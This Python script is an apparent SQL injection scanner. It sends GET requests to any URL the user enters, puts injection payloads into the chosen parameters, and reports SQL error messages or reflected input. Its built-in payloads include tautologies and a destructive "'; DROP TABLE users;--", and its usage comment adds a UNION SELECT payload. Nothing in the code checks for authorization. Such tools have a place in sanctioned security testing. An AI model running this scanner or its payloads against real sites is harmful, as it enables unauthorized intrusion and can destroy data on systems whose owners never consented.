import requests
from urllib.parse import urlencode

def sql_injection_tester(target, params, custom_payloads=None):
    # Predefined payloads
    default_payloads = ["' OR '1'='1", "'; DROP TABLE users;--", "' OR 'a'='a"]
    if custom_payloads:
        payloads = default_payloads + custom_payloads
    else:
        payloads = default_payloads

    print("\n--- Starting SQL Injection Testing ---")
    print(f"Target: {target}")
    print(f"Parameters: {', '.join(params)}")
    print(f"Payloads to test: {len(payloads)}\n")

    # Common SQL error keywords for response analysis
    sql_error_signatures = [
        "sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error"
    ]

    results = []
    for payload in payloads:
        for param in params:
            # Construct the URL with injected payload
            injected_url = f"{target}?{urlencode({param: payload})}"
            try:
                response = requests.get(injected_url, timeout=10)
                response_text = response.text.lower()

                # Analyze the response
                vulnerability_detected = False
                for error in sql_error_signatures:
                    if error in response_text:
                        results.append((injected_url, "SQL Error Detected"))
                        vulnerability_detected = True
                        break

                if not vulnerability_detected and payload.lower() in response_text:
                    results.append((injected_url, "Payload Reflected in Response"))

            except requests.RequestException as e:
                results.append((injected_url, f"Request Failed: {str(e)}"))

    # Display results
    if results:
        print("\n--- Potential Vulnerabilities Found ---")
        for url, status in results:
            print(f"[{status}] {url}")
    else:
        print("\nNo vulnerabilities detected.")
    print("\n--- Testing Complete ---")


# User Input
target = input("Enter target URL (e.g., http://example.com/search): ").strip()
params = input("Enter parameter names separated by commas (e.g., id,search): ").strip().split(",")
custom_payloads = input("Enter additional payloads separated by commas (or leave blank): ").strip()

if custom_payloads:
    custom_payloads = [payload.strip() for payload in custom_payloads.split(",")]

sql_injection_tester(target, params, custom_payloads)
#how to rune 
#Enter target URL (e.g., http://example.com/search): http://example.com/search
#Enter parameter names separated by commas (e.g., id,search): id,search
#Enter additional payloads separated by commas (or leave blank): ' UNION SELECT NULL,NULL;--

